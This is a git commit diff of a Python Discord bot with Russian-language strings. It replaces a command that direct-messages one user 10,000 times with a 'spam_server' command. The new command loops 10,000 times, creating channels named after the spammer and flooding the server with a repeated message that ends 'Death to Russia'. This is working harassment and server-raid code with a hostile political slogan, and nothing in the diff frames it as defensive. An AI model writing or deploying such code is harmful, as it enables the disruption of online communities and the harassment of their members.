1a693ade44cff6b6269cdeac32ffeb6660915864
Glebweider <glebweider@gmail.com>
2022-05-23 19:29:06 +0300

    update

--- bot.py
+++ bot.py
@@ -8,47 +8,29 @@ intents = discord.Intents.default()
 intents.members = True
 bot = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
 client = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
-
+bot.remove_command('help')
 
 @bot.event
 async def on_ready():
     await bot.change_presence(status=discord.Status.online, activity=discord.Game("Хороший бот"))
     print("Это самолёт, а не это вертолёт")
 
-
 @bot.command()
-async def idiot(ctx):
+async def help(ctx):
     embed = discord.Embed(
-    title = "Помощь test",
-    description = "`spam!test`",
+    title = "Помощь по спаму",
+    description = "`spam!spam_server - Спам сервера`",
     color = ''
     )
-
+    ctx.send(embed=embed)
                     
-@bot.command()
-async def spam_member(ctx, member):
-    for line2 in range(0 , 10000):
-        channel = client.get_user(int(member))
-        await channel.send('''Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-            Вы были заспамлены by hlebushek! Слава Украине! Смерть России''')
 
 @bot.command()
-async def test(ctx, member):
+async def spam_server(ctx):
     for line2 in range(0 , 10000):
-        channel = client.get_user(int(member))
-        await channel.send('''Тест''')
-
-
-
-
+        guild = ctx.message.guild
+        await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
+        await ctx.channel.send('Вы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России\nВы были заспамлены by hlebushek! Слава Украине! Смерть России')
 @bot.command()
 async def stop(ctx):
     await bot.change_presence(status=discord.Status.offline)
